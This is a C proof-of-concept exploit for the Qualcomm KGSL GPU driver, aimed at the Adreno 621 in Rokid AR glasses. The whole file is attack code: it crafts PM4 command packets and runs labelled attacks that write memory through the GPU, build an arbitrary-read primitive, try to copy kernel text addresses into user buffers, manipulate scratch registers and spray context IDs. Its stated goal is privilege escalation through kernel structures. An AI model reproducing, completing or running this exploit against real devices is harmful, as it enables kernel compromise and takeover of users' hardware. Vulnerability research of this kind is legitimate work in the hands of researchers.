/*
 * KGSL GPU Command Injection PoC
 * ================================
 *
 * Confirmed: GPU_COMMAND IOCTL returns success!
 * This means we can:
 * 1. Submit arbitrary GPU commands
 * 2. Potentially read/write kernel memory via GPU DMA
 * 3. Corrupt GPU hardware state
 *
 * Strategy:
 * 1. Craft Adreno PM4 commands to perform memory operations
 * 2. Use GPU to read/write arbitrary addresses
 * 3. Target kernel structures for privilege escalation
 *
 * Compile:
 * aarch64-linux-android31-clang -static -O2 -pthread -o kgsl_cmd_inject kgsl_cmd_inject.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <time.h>
#include <sched.h>

// ============================================================================
// KGSL Definitions
// ============================================================================

#define IOCTL_KGSL_GPUMEM_ALLOC 0xc018092f
#define IOCTL_KGSL_GPU_COMMAND 0xc0580940
#define IOCTL_KGSL_DEVICE_GETPROPERTY 0xc0100902

// Context management IOCTLs
#define KGSL_IOC_TYPE 0x09
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_DRAWCTXT_DESTROY _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy)

// Context flags
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000001
#define KGSL_CONTEXT_SUBMIT_IB_LIST 0x00000004
#define KGSL_CONTEXT_CTX_SWITCH 0x00000008
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_PER_CONTEXT_TS 0x00000040
#define KGSL_CONTEXT_NO_SNAPSHOT 0x00000400
#define KGSL_CONTEXT_PREEMPT_STYLE_ANY 0x00001000

// Context types
#define KGSL_CONTEXT_TYPE_SHIFT 20
#define KGSL_CONTEXT_TYPE_ANY 0
#define KGSL_CONTEXT_TYPE_GL 1
#define KGSL_CONTEXT_TYPE(type) ((type) << KGSL_CONTEXT_TYPE_SHIFT)

// ============================================================================
// Adreno GPU PM4 Packet Definitions (Adreno 6xx/5xx)
// ============================================================================

// PM4 Packet Types
#define PM4_PKT_TYPE0 0x00000000 // Write registers
#define PM4_PKT_TYPE2 0x80000000 // NOP
#define PM4_PKT_TYPE3 0xC0000000 // GPU commands
#define PM4_PKT_TYPE4 0x40000000 // Read/Write memory
#define PM4_PKT_TYPE7 0x70000000 // Extended

// Type 3 Opcodes (Adreno specific)
#define CP_NOP 0x10
#define CP_INDIRECT_BUFFER 0x3F
#define CP_INDIRECT_BUFFER_PFD 0x37
#define CP_MEM_WRITE 0x3D
#define CP_MEM_READ 0x15
#define CP_REG_TO_MEM 0x3E
#define CP_MEM_TO_REG 0x42
#define CP_WAIT_FOR_IDLE 0x26
#define CP_WAIT_FOR_ME 0x17
#define CP_CONTEXT_SWITCH 0x54
#define CP_SET_DRAW_STATE 0x43
#define CP_LOAD_STATE 0x30
#define CP_REG_RMW 0x21
#define CP_EXEC_CS 0x33
#define CP_BLIT 0x2C
#define CP_BOOTSTRAP_UCODE 0x6F
#define CP_COND_WRITE 0x45
#define CP_COND_EXEC 0x44
#define CP_REG_TEST 0x39

// Adreno 6xx specific
#define A6XX_CP_MEM_TO_MEM 0x73
#define A6XX_CP_MEMCPY 0x75
#define A6XX_CP_SCRATCH_TO_MEM 0x4E
#define A6XX_CP_MEM_TO_SCRATCH 0x4C
#define A6XX_CP_SET_MARKER 0x65
#define A6XX_CP_REG_WRITE 0x6D

// Register addresses (Adreno 6xx)
#define A6XX_CP_SCRATCH_REG0 0x578
#define A6XX_CP_SCRATCH_REG1 0x579
#define A6XX_CP_SCRATCH_REG2 0x57A
#define A6XX_CP_SCRATCH_REG3 0x57B
#define A6XX_CP_SCRATCH_REG4 0x57C
#define A6XX_CP_SCRATCH_REG5 0x57D
#define A6XX_CP_SCRATCH_REG6 0x57E
#define A6XX_CP_SCRATCH_REG7 0x57F

// ============================================================================
// Structures
// ============================================================================

struct gpumem_alloc_req
{
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
    uint32_t padding;
};

struct kgsl_command_object
{
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
    uint32_t id;
};

struct kgsl_gpu_command
{
    uint64_t flags;
    uint64_t cmdlist;
    uint64_t cmdsize;
    uint64_t objlist;
    uint64_t objsize;
    uint64_t synclist;
    uint64_t syncsize;
    uint32_t context_id;
    uint32_t numcmds;
    uint32_t numobjs;
    uint32_t numsyncs;
    uint32_t timestamp;
    uint32_t result;
    uint64_t result_ts;
};

struct kgsl_device_getproperty
{
    uint32_t type;
    void *value;
    uint32_t sizebytes;
};

struct kgsl_drawctxt_create
{
    uint32_t flags;
    uint32_t drawctxt_id;
};

struct kgsl_drawctxt_destroy
{
    uint32_t drawctxt_id;
};

// ============================================================================
// Globals
// ============================================================================

static sigjmp_buf jmp_env;
static volatile sig_atomic_t sig_received = 0;

int kgsl_fd = -1;
uint64_t gpu_base = 0;
void *gpu_map = NULL;
size_t gpu_size = 0x100000;  // 1MB for command buffer
uint32_t gpu_context_id = 0; // Valid GPU context

// ============================================================================
// Helpers
// ============================================================================

void sig_handler(int sig)
{
    sig_received = sig;
    siglongjmp(jmp_env, 1);
}

int safe_read64(void *ptr, uint64_t *out)
{
    sig_received = 0;
    if (sigsetjmp(jmp_env, 1) == 0)
    {
        *out = *(volatile uint64_t *)ptr;
        return 0;
    }
    return -1;
}

void hexdump(const char *desc, const void *data, size_t size)
{
    const uint8_t *p = (const uint8_t *)data;
    printf("%s:\n", desc);
    for (size_t i = 0; i < size && i < 256; i++)
    {
        if (i % 32 == 0)
            printf("  %04zx: ", i);
        printf("%02x", p[i]);
        if ((i + 1) % 32 == 0)
            printf("\n");
        else if ((i + 1) % 8 == 0)
            printf(" ");
    }
    if (size % 32 != 0)
        printf("\n");
}

int alloc_gpu_mem(uint64_t *addr, size_t size)
{
    struct gpumem_alloc_req alloc = {0};
    alloc.size = size;
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc) < 0)
    {
        return -1;
    }
    *addr = alloc.gpuaddr;
    return 0;
}

void *map_gpu_mem(uint64_t gpuaddr, size_t size)
{
    uint64_t page_idx = (gpuaddr - 0x4000000000ULL) / 0x1000;
    uint64_t offset = (page_idx + 1) * 0x1000;
    return mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl_fd, offset);
}

// ============================================================================
// PM4 Packet Building
// ============================================================================

// Build Type 3 packet header
static inline uint32_t pm4_type3_pkt(uint32_t opcode, uint32_t count)
{
    return PM4_PKT_TYPE3 | ((count - 1) << 16) | ((opcode & 0x7F) << 8);
}

// Build Type 4 packet header (register write)
static inline uint32_t pm4_type4_pkt(uint32_t regoff, uint32_t count)
{
    return PM4_PKT_TYPE4 | ((count) << 0) | ((regoff & 0x3FFFF) << 8);
}

// Build Type 7 packet header
static inline uint32_t pm4_type7_pkt(uint32_t opcode, uint32_t count)
{
    return PM4_PKT_TYPE7 | ((count) << 0) | ((opcode & 0x7F) << 16);
}

// Build NOP packet
static inline uint32_t pm4_nop(uint32_t count)
{
    return PM4_PKT_TYPE2 | ((count - 1) & 0x3FFF);
}

// ============================================================================
// Command Building
// ============================================================================

typedef struct
{
    uint32_t *buf;
    size_t capacity;
    size_t count;
} cmd_buffer_t;

void cmd_init(cmd_buffer_t *cmd, uint32_t *buf, size_t capacity)
{
    cmd->buf = buf;
    cmd->capacity = capacity;
    cmd->count = 0;
}

void cmd_add(cmd_buffer_t *cmd, uint32_t val)
{
    if (cmd->count < cmd->capacity)
    {
        cmd->buf[cmd->count++] = val;
    }
}

// Add NOP packet
void cmd_add_nop(cmd_buffer_t *cmd, int count)
{
    cmd_add(cmd, pm4_nop(count));
    for (int i = 1; i < count; i++)
    {
        cmd_add(cmd, 0);
    }
}

// Add wait for idle
// CP_WAIT_FOR_IDLE (0x26) is Type 3 with 0 payload dwords
void cmd_add_wait_idle(cmd_buffer_t *cmd)
{
    // Type 3 packet with count=1 (header says N-1, so 0 means 1 dword payload)
    cmd_add(cmd, pm4_type3_pkt(CP_WAIT_FOR_IDLE, 1));
    cmd_add(cmd, 0); // Padding dword required
}

// Add register write (Type 4)
void cmd_add_reg_write(cmd_buffer_t *cmd, uint32_t reg, uint32_t value)
{
    cmd_add(cmd, pm4_type4_pkt(reg, 1));
    cmd_add(cmd, value);
}

// Add memory write command - TRY BOTH TYPE 3 AND TYPE 7
// Type 3 format for classic CP_MEM_WRITE
void cmd_add_mem_write_type3(cmd_buffer_t *cmd, uint64_t addr, uint64_t value)
{
    // Type 3: 0xC0000000 | (count-1)<<16 | opcode<<8
    uint32_t header = PM4_PKT_TYPE3 | ((4 - 1) << 16) | ((CP_MEM_WRITE & 0x7F) << 8);
    cmd_add(cmd, header);
    cmd_add(cmd, (uint32_t)(addr & 0xFFFFFFFF));
    cmd_add(cmd, (uint32_t)(addr >> 32));
    cmd_add(cmd, (uint32_t)(value & 0xFFFFFFFF));
    cmd_add(cmd, (uint32_t)(value >> 32));
}

// Type 7 format for Adreno 6xx CP_MEM_WRITE
void cmd_add_mem_write_type7(cmd_buffer_t *cmd, uint64_t addr, uint64_t value)
{
    // Type 7: 0x70000000 | opcode<<16 | count
    uint32_t header = PM4_PKT_TYPE7 | ((CP_MEM_WRITE & 0x7F) << 16) | 4;
    cmd_add(cmd, header);
    cmd_add(cmd, (uint32_t)(addr & 0xFFFFFFFF));
    cmd_add(cmd, (uint32_t)(addr >> 32));
    cmd_add(cmd, (uint32_t)(value & 0xFFFFFFFF));
    cmd_add(cmd, (uint32_t)(value >> 32));
}

// Default: try Type 7 (more likely for Adreno 6xx)
void cmd_add_mem_write(cmd_buffer_t *cmd, uint64_t addr, uint64_t value)
{
    cmd_add_mem_write_type7(cmd, addr, value);
}

// Add memory to memory copy
void cmd_add_memcpy(cmd_buffer_t *cmd, uint64_t dst, uint64_t src, uint32_t dwords)
{
    cmd_add(cmd, pm4_type7_pkt(A6XX_CP_MEM_TO_MEM, 5));
    cmd_add(cmd, dwords);
    cmd_add(cmd, (uint32_t)(dst & 0xFFFFFFFF));
    cmd_add(cmd, (uint32_t)(dst >> 32));
    cmd_add(cmd, (uint32_t)(src & 0xFFFFFFFF));
    cmd_add(cmd, (uint32_t)(src >> 32));
}

// Add scratch to memory
void cmd_add_scratch_to_mem(cmd_buffer_t *cmd, uint64_t addr, uint32_t scratch_reg)
{
    cmd_add(cmd, pm4_type7_pkt(A6XX_CP_SCRATCH_TO_MEM, 3));
    cmd_add(cmd, scratch_reg);
    cmd_add(cmd, (uint32_t)(addr & 0xFFFFFFFF));
    cmd_add(cmd, (uint32_t)(addr >> 32));
}

// Add memory to scratch
void cmd_add_mem_to_scratch(cmd_buffer_t *cmd, uint32_t scratch_reg, uint64_t addr)
{
    cmd_add(cmd, pm4_type7_pkt(A6XX_CP_MEM_TO_SCRATCH, 3));
    cmd_add(cmd, scratch_reg);
    cmd_add(cmd, (uint32_t)(addr & 0xFFFFFFFF));
    cmd_add(cmd, (uint32_t)(addr >> 32));
}

// Add conditional write
// CP_COND_WRITE (0x45) is a classic Type 3 command
void cmd_add_cond_write(cmd_buffer_t *cmd, uint64_t compare_addr,
                        uint64_t write_addr, uint32_t ref, uint32_t mask, uint32_t value)
{
    cmd_add(cmd, pm4_type3_pkt(CP_COND_WRITE, 8));
    cmd_add(cmd, 0); // function: write if ref == (mem & mask)
    cmd_add(cmd, (uint32_t)(compare_addr & 0xFFFFFFFF));
    cmd_add(cmd, (uint32_t)(compare_addr >> 32));
    cmd_add(cmd, ref);
    cmd_add(cmd, mask);
    cmd_add(cmd, (uint32_t)(write_addr & 0xFFFFFFFF));
    cmd_add(cmd, (uint32_t)(write_addr >> 32));
    cmd_add(cmd, value);
}

// ============================================================================
// Submit GPU Commands
// ============================================================================

int submit_gpu_cmd(uint32_t *cmds, size_t dword_count, uint32_t context_id)
{
    // Get command buffer GPU address
    // We use the first page for control, next pages for commands
    uint64_t cmd_gpuaddr = gpu_base + 0x10000;

    // Copy commands to GPU memory
    memcpy((char *)gpu_map + 0x10000, cmds, dword_count * 4);

    // Ensure writes are visible
    __sync_synchronize();

    // Build command object
    struct kgsl_command_object cmd_obj = {0};
    cmd_obj.gpuaddr = cmd_gpuaddr;
    cmd_obj.size = dword_count * 4;
    cmd_obj.flags = 0;
    cmd_obj.id = 0;

    // Submit
    struct kgsl_gpu_command gpu_cmd = {0};
    gpu_cmd.flags = 0;
    gpu_cmd.cmdlist = (uint64_t)&cmd_obj;
    gpu_cmd.cmdsize = sizeof(cmd_obj);
    gpu_cmd.numcmds = 1;
    gpu_cmd.context_id = context_id;

    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd);
    return ret;
}

// ============================================================================
// Attack 1: Memory Write via GPU - Test BOTH Type 3 and Type 7
// ============================================================================

void test_gpu_mem_write(void)
{
    printf("\n=== Test 1: GPU Memory Write (Testing Both Packet Types) ===\n");

    // ========== Test Type 7 Packet ==========
    printf("\n[*] Testing Type 7 CP_MEM_WRITE...\n");
    uint64_t target_addr_t7 = gpu_base + 0x80000;
    memset((char *)gpu_map + 0x80000, 0, 0x100);
    printf("[*] Target at GPU addr 0x%lx\n", target_addr_t7);

    uint32_t cmds[256];
    cmd_buffer_t cmd;
    cmd_init(&cmd, cmds, 256);

    cmd_add_nop(&cmd, 4);
    cmd_add_wait_idle(&cmd);
    cmd_add_mem_write_type7(&cmd, target_addr_t7, 0xAAAAAAAA11111111ULL);
    cmd_add_wait_idle(&cmd);
    cmd_add_nop(&cmd, 4);

    printf("[DEBUG] Type 7 Command stream:\n");
    for (size_t i = 0; i < cmd.count; i++)
    {
        printf("  [%2zu] 0x%08x\n", i, cmds[i]);
    }

    int ret = submit_gpu_cmd(cmds, cmd.count, gpu_context_id);
    printf("[*] Type 7 Submit result: %d (ctx=%u)\n", ret, gpu_context_id);
    usleep(50000);

    uint64_t result_t7 = *(volatile uint64_t *)((char *)gpu_map + 0x80000);
    printf("[*] Type 7 Result: 0x%016lx %s\n", result_t7,
           result_t7 == 0xAAAAAAAA11111111ULL ? "[SUCCESS!]" : "[FAILED]");

    // ========== Test Type 3 Packet ==========
    printf("\n[*] Testing Type 3 CP_MEM_WRITE...\n");
    uint64_t target_addr_t3 = gpu_base + 0x81000;
    memset((char *)gpu_map + 0x81000, 0, 0x100);
    printf("[*] Target at GPU addr 0x%lx\n", target_addr_t3);

    cmd_init(&cmd, cmds, 256);
    cmd_add_nop(&cmd, 4);
    cmd_add_wait_idle(&cmd);
    cmd_add_mem_write_type3(&cmd, target_addr_t3, 0xBBBBBBBB22222222ULL);
    cmd_add_wait_idle(&cmd);
    cmd_add_nop(&cmd, 4);

    printf("[DEBUG] Type 3 Command stream:\n");
    for (size_t i = 0; i < cmd.count; i++)
    {
        printf("  [%2zu] 0x%08x\n", i, cmds[i]);
    }

    ret = submit_gpu_cmd(cmds, cmd.count, gpu_context_id);
    printf("[*] Type 3 Submit result: %d (ctx=%u)\n", ret, gpu_context_id);
    usleep(50000);

    uint64_t result_t3 = *(volatile uint64_t *)((char *)gpu_map + 0x81000);
    printf("[*] Type 3 Result: 0x%016lx %s\n", result_t3,
           result_t3 == 0xBBBBBBBB22222222ULL ? "[SUCCESS!]" : "[FAILED]");

    // ========== Test Direct Memory (Sanity Check) ==========
    printf("\n[*] Testing direct memory write (sanity check)...\n");
    *(volatile uint64_t *)((char *)gpu_map + 0x82000) = 0xCCCCCCCC33333333ULL;
    __sync_synchronize();
    uint64_t result_dm = *(volatile uint64_t *)((char *)gpu_map + 0x82000);
    printf("[*] Direct write: 0x%016lx %s\n", result_dm,
           result_dm == 0xCCCCCCCC33333333ULL ? "[SUCCESS!]" : "[FAILED]");

    // ========== Summary ==========
    printf("\n=== GPU Memory Write Summary ===\n");
    if (result_t7 == 0xAAAAAAAA11111111ULL)
    {
        printf("[!!!] TYPE 7 WORKS - Use pm4_type7_pkt() for CP_MEM_WRITE!\n");
    }
    if (result_t3 == 0xBBBBBBBB22222222ULL)
    {
        printf("[!!!] TYPE 3 WORKS - Use pm4_type3_pkt() for CP_MEM_WRITE!\n");
    }
    if (result_t7 != 0xAAAAAAAA11111111ULL && result_t3 != 0xBBBBBBBB22222222ULL)
    {
        printf("[!] Neither packet type worked - need further investigation\n");
        printf("[!] Possible causes:\n");
        printf("    - GPU protected mode blocking DMA\n");
        printf("    - Commands queued but not executed\n");
        printf("    - Wrong GPU address space\n");
    }
}

// ============================================================================
// Attack 2: GPU Memory Copy (arbitrary read primitive)
// ============================================================================

void test_gpu_memcpy(void)
{
    printf("\n=== Test 2: GPU Memory Copy ===\n");

    // Set up source with known pattern
    uint64_t src_addr = gpu_base + 0x40000;
    uint64_t dst_addr = gpu_base + 0x50000;

    uint64_t *src = (uint64_t *)((char *)gpu_map + 0x40000);
    uint64_t *dst = (uint64_t *)((char *)gpu_map + 0x50000);

    // Write source pattern
    src[0] = 0x1111111111111111ULL;
    src[1] = 0x2222222222222222ULL;
    src[2] = 0x3333333333333333ULL;
    src[3] = 0x4444444444444444ULL;

    // Clear destination
    memset(dst, 0, 0x1000);

    printf("[*] Source at 0x%lx, Dest at 0x%lx\n", src_addr, dst_addr);

    // Build memcpy command
    uint32_t cmds[256];
    cmd_buffer_t cmd;
    cmd_init(&cmd, cmds, 256);

    cmd_add_nop(&cmd, 4);
    cmd_add_wait_idle(&cmd);
    cmd_add_memcpy(&cmd, dst_addr, src_addr, 8); // 8 dwords = 32 bytes
    cmd_add_wait_idle(&cmd);
    cmd_add_nop(&cmd, 4);

    int ret = submit_gpu_cmd(cmds, cmd.count, gpu_context_id);
    printf("[*] Submit result: %d (ctx=%u)\n", ret, gpu_context_id);

    usleep(10000);

    // Check result
    printf("[*] Source: 0x%lx 0x%lx 0x%lx 0x%lx\n", src[0], src[1], src[2], src[3]);
    printf("[*] Dest:   0x%lx 0x%lx 0x%lx 0x%lx\n", dst[0], dst[1], dst[2], dst[3]);

    if (dst[0] == src[0] && dst[1] == src[1])
    {
        printf("[!!!] GPU MEMCPY CONFIRMED!\n");
    }
}

// ============================================================================
// Attack 3: Attempt to read kernel memory via GPU
// ============================================================================

void test_kernel_read(void)
{
    printf("\n=== Test 3: Kernel Memory Read Attempt ===\n");

    // Kernel text base for Android ARM64 is typically around 0xffffffc010000000
    uint64_t kernel_targets[] = {
        0xffffffc008000000ULL, // Early boot
        0xffffffc010000000ULL, // kernel .text
        0xffffffc011000000ULL,
        0xffffff8008000000ULL, // Alternative
        0xffffff8010000000ULL,
    };

    uint64_t result_addr = gpu_base + 0x60000;
    uint64_t *result = (uint64_t *)((char *)gpu_map + 0x60000);

    for (size_t i = 0; i < sizeof(kernel_targets) / sizeof(kernel_targets[0]); i++)
    {
        uint64_t kaddr = kernel_targets[i];

        // Clear result
        memset(result, 0, 0x1000);
        result[0] = 0xBAADBAADBAADBAADULL; // Marker

        // Build command to read kernel memory
        uint32_t cmds[256];
        cmd_buffer_t cmd;
        cmd_init(&cmd, cmds, 256);

        cmd_add_nop(&cmd, 4);
        cmd_add_wait_idle(&cmd);

        // Try to copy from kernel address to our buffer
        cmd_add_memcpy(&cmd, result_addr, kaddr, 8);

        cmd_add_wait_idle(&cmd);
        cmd_add_nop(&cmd, 4);

        int ret = submit_gpu_cmd(cmds, cmd.count, gpu_context_id);
        usleep(5000);

        // Check if result changed
        if (result[0] != 0xBAADBAADBAADBAADULL && result[0] != 0)
        {
            printf("[!!!] Kernel read at 0x%lx: 0x%lx\n", kaddr, result[0]);
        }
    }

    printf("[*] Kernel read test complete\n");
}

// ============================================================================
// Attack 4: GPU Scratch Register Manipulation
// ============================================================================

void test_scratch_regs(void)
{
    printf("\n=== Test 4: GPU Scratch Register Manipulation ===\n");

    uint64_t result_addr = gpu_base + 0x70000;
    uint64_t *result = (uint64_t *)((char *)gpu_map + 0x70000);

    // Clear result
    memset(result, 0, 0x1000);

    // Build commands to write scratch reg and dump to memory
    uint32_t cmds[256];
    cmd_buffer_t cmd;
    cmd_init(&cmd, cmds, 256);

    cmd_add_nop(&cmd, 4);
    cmd_add_wait_idle(&cmd);

    // Write to scratch register
    cmd_add_reg_write(&cmd, A6XX_CP_SCRATCH_REG0, 0xDEADBEEF);
    cmd_add_reg_write(&cmd, A6XX_CP_SCRATCH_REG1, 0xCAFEBABE);

    // Dump scratch to memory
    cmd_add_scratch_to_mem(&cmd, result_addr, 0);     // SCRATCH_REG0
    cmd_add_scratch_to_mem(&cmd, result_addr + 8, 1); // SCRATCH_REG1

    cmd_add_wait_idle(&cmd);
    cmd_add_nop(&cmd, 4);

    int ret = submit_gpu_cmd(cmds, cmd.count, gpu_context_id);
    printf("[*] Submit result: %d (ctx=%u)\n", ret, gpu_context_id);

    usleep(10000);

    printf("[*] Scratch dump: 0x%lx 0x%lx\n", result[0], result[1]);

    if (result[0] == 0xDEADBEEF)
    {
        printf("[!!!] SCRATCH REGISTER ACCESS CONFIRMED!\n");
    }
}

// ============================================================================
// Attack 5: Context ID Spray and Race
// ============================================================================

void test_context_race(void)
{
    printf("\n=== Test 5: Context ID Spray and Race ===\n");

    uint32_t cmds[64];
    cmd_buffer_t cmd;

    int success_count = 0;

    // Try many context IDs quickly
    for (uint32_t ctx = 0; ctx < 1000; ctx++)
    {
        cmd_init(&cmd, cmds, 64);
        cmd_add_nop(&cmd, 16);

        int ret = submit_gpu_cmd(cmds, cmd.count, ctx);
        if (ret == 0)
        {
            success_count++;
            if (success_count <= 10)
            {
                printf("[+] Context %u: SUCCESS\n", ctx);
            }
        }
    }

    printf("[*] Total successful submissions: %d/1000\n", success_count);
}

// ============================================================================
// Main
// ============================================================================

int main(int argc, char **argv)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  KGSL GPU Command Injection PoC                               ║\n");
    printf("║  Target: Rokid AR Glasses - Adreno 621                        ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n\n");

    signal(SIGSEGV, sig_handler);
    signal(SIGBUS, sig_handler);

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
    {
        printf("[-] Cannot open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] kgsl_fd = %d\n", kgsl_fd);

    // Allocate large GPU buffer
    if (alloc_gpu_mem(&gpu_base, gpu_size) < 0)
    {
        printf("[-] GPU alloc failed\n");
        return 1;
    }
    printf("[+] GPU buffer at 0x%lx (size 0x%zx)\n", gpu_base, gpu_size);

    // Map it
    gpu_map = map_gpu_mem(gpu_base, gpu_size);
    if (gpu_map == MAP_FAILED)
    {
        printf("[-] mmap failed\n");
        return 1;
    }
    printf("[+] Mapped at %p\n", gpu_map);

    // Clear buffer
    memset(gpu_map, 0, gpu_size);

    // Create GPU context - CRITICAL for command execution!
    // Must specify context TYPE (GL) and required flags
    struct kgsl_drawctxt_create ctx_create = {
        .flags = KGSL_CONTEXT_TYPE(KGSL_CONTEXT_TYPE_GL) |
                 KGSL_CONTEXT_SUBMIT_IB_LIST |
                 KGSL_CONTEXT_PREAMBLE |
                 KGSL_CONTEXT_PER_CONTEXT_TS,
        .drawctxt_id = 0,
    };
    printf("[*] Attempting context creation with flags=0x%x\n", ctx_create.flags);
    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx_create) < 0)
    {
        printf("[-] Failed to create GPU context: %s\n", strerror(errno));
        printf("[!] Trying without context...\n");
        gpu_context_id = 0;
    }
    else
    {
        gpu_context_id = ctx_create.drawctxt_id;
        printf("[+] Created GPU context: ID=%u\n", gpu_context_id);
    }

    // Run tests
    test_gpu_mem_write();
    test_gpu_memcpy();
    test_kernel_read();
    test_scratch_regs();
    test_context_race();

    // Cleanup context
    if (gpu_context_id > 0)
    {
        struct kgsl_drawctxt_destroy ctx_destroy = {.drawctxt_id = gpu_context_id};
        ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &ctx_destroy);
    }

    // Cleanup
    munmap(gpu_map, gpu_size);
    close(kgsl_fd);

    printf("\n=== All Tests Complete ===\n");
    return 0;
}
